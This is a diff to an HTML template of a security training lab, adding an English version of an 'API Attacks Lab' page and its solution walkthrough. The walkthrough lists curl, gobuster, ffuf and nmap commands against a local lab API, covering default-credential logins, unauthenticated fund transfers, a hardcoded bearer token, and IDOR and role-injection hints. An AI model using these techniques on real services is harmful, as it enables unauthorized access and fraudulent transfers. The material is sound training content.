@@ -4,28 +4,56 @@
 <div class="p-6 max-w-3xl mx-auto">
   {% include '_lab_header.html' %}
   <div class="hl-card mb-4">
-    <h2 class="text-sm font-semibold" style="color:var(--hl-primary)">API Attacks Lab</h2>
-    <p class="text-sm text-gray-600 dark:text-gray-400 mt-3 mb-3">
-      Explora y explota vulnerabilidades en una API moderna. No se dan pistas en esta sección.
-    </p>
+    <div class="lang-content" data-lang="es">
+      <h2 class="text-sm font-semibold" style="color:var(--hl-primary)">API Attacks Lab</h2>
+      <p class="text-sm text-gray-600 dark:text-gray-400 mt-3 mb-3">
+        Explora y explota vulnerabilidades en una API moderna. No se dan pistas en esta sección.
+      </p>
+    </div>
+    <div class="lang-content" data-lang="en" style="display:none">
+      <h2 class="text-sm font-semibold" style="color:var(--hl-primary)">API Attacks Lab</h2>
+      <p class="text-sm text-gray-600 dark:text-gray-400 mt-3 mb-3">
+        Explore and exploit vulnerabilities in a modern API. No hints are provided in this section.
+      </p>
+    </div>
   </div>
 
   <div class="hl-card mb-4">
-    <h3 class="text-sm font-semibold" style="color:var(--hl-primary)">Objetivos</h3>
-    <ul class="text-sm text-gray-600 dark:text-gray-400 mt-3 pl-5 list-disc">
-      <li>Identificar endpoints y métodos expuestos por la API.</li>
-      <li>Enumerar usuarios y recursos accesibles.</li>
-      <li>Encontrar puntos donde la autenticación o validación son insuficientes.</li>
-      <li>Exfiltrar datos sensibles o forzar transferencias si la lógica es vulnerable.</li>
-    </ul>
+    <div class="lang-content" data-lang="es">
+      <h3 class="text-sm font-semibold" style="color:var(--hl-primary)">Objetivos</h3>
+      <ul class="text-sm text-gray-600 dark:text-gray-400 mt-3 pl-5 list-disc">
+        <li>Identificar endpoints y métodos expuestos por la API.</li>
+        <li>Enumerar usuarios y recursos accesibles.</li>
+        <li>Encontrar puntos donde la autenticación o validación son insuficientes.</li>
+        <li>Exfiltrar datos sensibles o forzar transferencias si la lógica es vulnerable.</li>
+      </ul>
 
-    <h3 class="text-sm font-semibold mt-4" style="color:var(--hl-primary)">Endpoints disponibles</h3>
-    <ul class="text-sm text-gray-600 dark:text-gray-400 mt-2 pl-5 list-disc">
-      <li><code>GET /api/v1/users</code> — listar usuarios (público o con token).</li>
-      <li><code>POST /api/v1/auth</code> — autenticación, devuelve token.</li>
-      <li><code>POST /api/v1/transfer</code> — transferencias entre cuentas.</li>
-      <li><code>GET /api/v1/notes</code> — notas privadas por usuario.</li>
-    </ul>
+      <h3 class="text-sm font-semibold mt-4" style="color:var(--hl-primary)">Endpoints disponibles</h3>
+      <ul class="text-sm text-gray-600 dark:text-gray-400 mt-2 pl-5 list-disc">
+        <li><code>GET /api/v1/users</code> — listar usuarios (público o con token).</li>
+        <li><code>POST /api/v1/auth</code> — autenticación, devuelve token.</li>
+        <li><code>POST /api/v1/transfer</code> — transferencias entre cuentas.</li>
+        <li><code>GET /api/v1/notes</code> — notas privadas por usuario.</li>
+      </ul>
+    </div>
+
+    <div class="lang-content" data-lang="en" style="display:none">
+      <h3 class="text-sm font-semibold" style="color:var(--hl-primary)">Objectives</h3>
+      <ul class="text-sm text-gray-600 dark:text-gray-400 mt-3 pl-5 list-disc">
+        <li>Identify API-exposed endpoints and methods.</li>
+        <li>Enumerate accessible users and resources.</li>
+        <li>Find weak points where authentication or validation is insufficient.</li>
+        <li>Exfiltrate sensitive data or force transfers if business logic is vulnerable.</li>
+      </ul>
+
+      <h3 class="text-sm font-semibold mt-4" style="color:var(--hl-primary)">Available endpoints</h3>
+      <ul class="text-sm text-gray-600 dark:text-gray-400 mt-2 pl-5 list-disc">
+        <li><code>GET /api/v1/users</code> — list users (public or token-based).</li>
+        <li><code>POST /api/v1/auth</code> — authenticate and return a token.</li>
+        <li><code>POST /api/v1/transfer</code> — transfer funds between accounts.</li>
+        <li><code>GET /api/v1/notes</code> — user private notes.</li>
+      </ul>
+    </div>
   </div>
 
   <!-- Resolución del lab: caja flotante (todo el contenido de ayuda/solución debe ir aquí) -->
@@ -119,7 +147,90 @@ curl http://localhost:5000/api/v1/notes -H 'Authorization: Bearer hacklabs-integ
     </div>
     <div class="lang-content" data-lang="en" style="display:none">
       <h3>Resolution — API Attacks Lab</h3>
-      <p>Use the Spanish tab for the full walkthrough. This English placeholder mirrors the Spanish guidance.</p>
+      <ol>
+        <li><strong>API reconnaissance</strong>
+          <ul>
+            <li>Enumerate exposed endpoints and methods (GET/POST/OPTIONS). Useful tools: <code>curl</code>, <code>httpie</code>, <code>nmap</code>, <code>gobuster</code>.</li>
+            <li>Look for public docs (OpenAPI/Swagger) in common paths: <code>/openapi.json</code>, <code>/swagger.json</code>, <code>/docs</code>.</li>
+          </ul>
+        </li>
+        <li><strong>Recon and enumeration (commands)</strong>
+          <pre><code class="language-bash"># Test HTTP methods and headers
+curl -I -X OPTIONS http://localhost:5000/api/v1/users
+
+# Look for OpenAPI/Swagger docs
+curl http://localhost:5000/openapi.json || curl http://localhost:5000/swagger.json
+
+# Enumerate with gobuster (common paths)
+gobuster dir -u http://localhost:5000 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,json -t 50
+
+# API endpoint fuzzing with ffuf
+ffuf -u "http://localhost:5000/api/v1/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302
+
+# Internal port scan (if possible)
+nmap -Pn -p- 127.0.0.1
+
+# Quick requests and JSON formatting (use jq to extract fields)
+curl -s http://localhost:5000/api/v1/users | jq .
+</code></pre>
+        </li>
+        <li><strong>Difficulty: Easy</strong>
+          <ul>
+            <li>Try weak authentication with default credentials:
+              <pre><code class="language-bash">curl -X POST http://localhost:5000/api/v1/auth \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"admin","password":"admin"}'</code></pre>
+            </li>
+            <li>List users and public resources:
+              <pre><code class="language-bash">curl http://localhost:5000/api/v1/users</code></pre>
+            </li>
+            <li>Try unauthenticated operations (transfers, note reading):
+              <pre><code class="language-bash">curl -X POST http://localhost:5000/api/v1/transfer \
+  -H 'Content-Type: application/json' \
+  -d '{"amount":100,"to":"admin"}'
+curl http://localhost:5000/api/v1/notes</code></pre>
+          </ul>
+        </li>
+        <li><strong>Difficulty: Medium</strong>
+          <ul>
+            <li>Some endpoints require a token: obtain one and reuse it in the <code>Authorization: Bearer &lt;token&gt;</code> header.
+              <pre><code class="language-bash">TOKEN=$(curl -s -X POST http://localhost:5000/api/v1/auth -H 'Content-Type: application/json' -d '{"username":"admin","password":"admin"}' | jq -r .token)
+curl http://localhost:5000/api/v1/notes -H "Authorization: Bearer $TOKEN"</code></pre>
+            </li>
+            <li>Test missing confirmations or weak transfer validation (the <code>confirm</code> parameter):
+              <pre><code class="language-bash">curl -X POST http://localhost:5000/api/v1/transfer \
+  -H 'Content-Type: application/json' \
+  -d '{"amount":100,"to":"admin","confirm":"yes"}'</code></pre>
+            </li>
+          </ul>
+        </li>
+        <li><strong>Difficulty: Hard</strong>
+          <ul>
+            <li>At higher difficulty, a specific header is required: <code>Authorization: Bearer hacklabs-integrity-token</code>. Figure out how to derive or forge this token (exfiltration, endpoint leakage, reuse).</li>
+            <li>If an endpoint is role-restricted, try privilege escalation via IDOR or JSON parameter tampering (for example, injecting <code>"role":"admin"</code> into poorly validated objects).</li>
+          </ul>
+        </li>
+      </ol>
+
+      <h4>Example commands</h4>
+      <pre><code class="language-bash"># Insecure authentication
+curl -X POST http://localhost:5000/api/v1/auth -H 'Content-Type: application/json' -d '{"username":"victim","password":"password123"}'
+
+# Enumerate users
+curl http://localhost:5000/api/v1/users
+
+# Vulnerable transfer (without confirmation)
+curl -X POST http://localhost:5000/api/v1/transfer -H 'Content-Type: application/json' -d '{"amount":100,"to":"admin"}'
+
+# Access private notes (with token if required)
+curl http://localhost:5000/api/v1/notes -H 'Authorization: Bearer hacklabs-integrity-token'
+</code></pre>
+
+      <h4>References and tools</h4>
+      <ul>
+        <li><a href="https://owasp.org/www-project-api-security/" target="_blank" rel="noopener">OWASP API Security</a></li>
+        <li><a href="https://portswigger.net/web-security/api" target="_blank" rel="noopener">PortSwigger - API Security</a></li>
+      </ul>
     </div>
   </div>
 </div>
